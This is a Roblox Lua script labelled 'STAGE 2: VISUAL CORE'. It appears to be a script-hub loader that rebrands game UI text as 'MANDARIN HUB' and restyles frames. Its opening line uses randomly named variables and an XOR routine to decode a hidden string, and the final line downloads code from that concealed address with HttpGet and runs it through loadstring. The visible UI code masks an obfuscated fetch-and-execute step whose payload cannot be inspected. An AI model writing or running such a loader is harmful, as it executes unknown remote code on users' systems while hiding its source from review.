
--[[ STAGE 2: VISUAL CORE ]]
local kFDu83PbCyXiP86yo9uY="\159\143\131\131\184\117\124\112\183\186\160\167\170\173\166\209\149\220\204\206\132\253\206\232\180\242\230\206\234\243\016\242\018"local v_yGRh8lTzjWASYNpDWuqJ=153 local GgjnnGwVvcjw=135 local SrHzTtvo5TxpPPzU=1 local NzCRUxUUv3DOhs1DrJX=4 local GzS8XJoiamakyNAkEkdL=19 local WoZRkHML9Y5R_q8DLCCeY=false local iJ_vmU6HpMOW40=bit32 and bit32.bxor if not iJ_vmU6HpMOW40 then iJ_vmU6HpMOW40=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local mdlw7vLD8dTSUE={}for qKuu9Tu8UkLiYtpuUw=1,#kFDu83PbCyXiP86yo9uY do local xHgOiLSf5pzyF_tOa68HM=string.byte(kFDu83PbCyXiP86yo9uY,qKuu9Tu8UkLiYtpuUw)local mJaniXhWpNO9ZB=(GgjnnGwVvcjw+(qKuu9Tu8UkLiYtpuUw*NzCRUxUUv3DOhs1DrJX)+GzS8XJoiamakyNAkEkdL)%256 if SrHzTtvo5TxpPPzU==0 then xHgOiLSf5pzyF_tOa68HM=(xHgOiLSf5pzyF_tOa68HM-mJaniXhWpNO9ZB)%256 mdlw7vLD8dTSUE[qKuu9Tu8UkLiYtpuUw]=string.char(iJ_vmU6HpMOW40(xHgOiLSf5pzyF_tOa68HM,v_yGRh8lTzjWASYNpDWuqJ))else xHgOiLSf5pzyF_tOa68HM=iJ_vmU6HpMOW40(xHgOiLSf5pzyF_tOa68HM,v_yGRh8lTzjWASYNpDWuqJ)mdlw7vLD8dTSUE[qKuu9Tu8UkLiYtpuUw]=string.char((xHgOiLSf5pzyF_tOa68HM-mJaniXhWpNO9ZB)%256)end end local AWzxV9lID1Gm6U=table.concat(mdlw7vLD8dTSUE)if WoZRkHML9Y5R_q8DLCCeY then AWzxV9lID1Gm6U=string.reverse(AWzxV9lID1Gm6U)end local plpDchzJaE12=AWzxV9lID1Gm6U
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(plpDchzJaE12))()
